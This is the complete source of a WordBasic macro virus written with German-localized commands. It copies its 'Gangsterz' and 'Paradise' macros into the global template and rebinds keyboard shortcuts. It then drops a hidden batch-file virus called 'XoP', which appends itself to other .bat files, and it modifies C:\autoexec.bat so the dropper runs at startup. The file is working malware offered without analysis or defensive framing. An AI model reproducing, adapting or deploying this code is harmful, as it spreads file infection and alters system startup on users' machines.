Sub MAIN
On Error Goto Done

ExtrasAnpassenTastatur .TastenSchlüssel = 32, .Kategorie = 2, .Name = "Gangsterz", .Hinzufügen, .Kontext = 0
ExtrasAnpassenTastatur .TastenSchlüssel = 69, .Kategorie = 2, .Name = "Paradise", .Hinzufügen, .Kontext = 1
ExtrasAnpassenTastatur .TastenSchlüssel = 32, .Kategorie = 2, .Name = "Gangsterz", .Hinzufügen, .Kontext = 1
ExtrasAnpassenTastatur .TastenSchlüssel = 69, .Kategorie = 2, .Name = "Paradise", .Hinzufügen, .Kontext = 0

G$ = FensterName$() + ":Gangsterz"
P$ = FensterName$() + ":Paradise"

NJ$ = MakroDateiName$("Gangsterz")
F$ = DateiNameInfo$(NJ$, 5)

If CheckInstalled = 0 Then
	MakroKopieren G$, "Global:Gangsterz", 1
	MakroKopieren P$, "Global:Paradise", 1
	DateiAllesSpeichern 1, 1
Else
	Goto Done
End If

Done:
A$ = DateiName$()
If A$ = "" Then
	Goto Finish
Else
	Einfügen " "
End If

Finish:
L$ = GetProfileString$("Intl", "XOP")
If L$ = "Installed" Then
	Goto Finito
Else
	Dropper
	SetProfileString "Intl", "XOP", "Installed"
	On Error Goto Finito
	Open "C:\autoexec.bat" For Append As #1
	Print #1, "@echo off"
	Print #1, F$ + "Xop.bat"
	Close #1
End If

Finito:
End Sub

Function CheckInstalled
    CheckInstalled = 0
    If ZählenMakros(0) > 0 Then
        For i = 1 To ZählenMakros(0)
            If MakroName$(i, 0) = "Gangsterz" Then
                CheckInstalled = 1
            End If
        Next i
    End If
End Function

Sub Dropper
	NJ$ = MakroDateiName$("Gangsterz")
	F$ = DateiNameInfo$(NJ$, 5)
	Open F$ + "XOP.Bat" For Output As #1
	Print #1, "@echo off%[XoP]%"
	Print #1, "if '%XoP%=='11 goto XoP2"
	Print #1, "if '%2=='_ goto XoP1"
	Print #1, "if exist C:\XoP.bat goto XoP"
	Print #1, "if not exist %0.bat goto XoP2"
	Print #1, "find" + Chr$(32) + Chr$(34) + "XoP" + Chr$(34) + " < % 0 bat > C:\XoP.bat "
	Print #1, "attrib C:\XoP.bat +h"
	Print #1, ":XoP"
	Print #1, "for %%v in (*.bat ..\*.bat) do call C:\XoP %%v _"
	Print #1, "set XoP="
	Print #1, "goto XoP2"
	Print #1, ":XoP1"
	Print #1, "find /i" + Chr$(32) + Chr$(34) + "XoP" + Chr$(34) + Chr$(32) + "<%1>nul"
	Print #1, "if not errorlevel 1 goto XoP2"
	Print #1, "type C:\XoP.bat>>%1"
	Print #1, "set XoP=%XoP%1"
	Print #1, ":XoP2"
	Close #1
End Sub
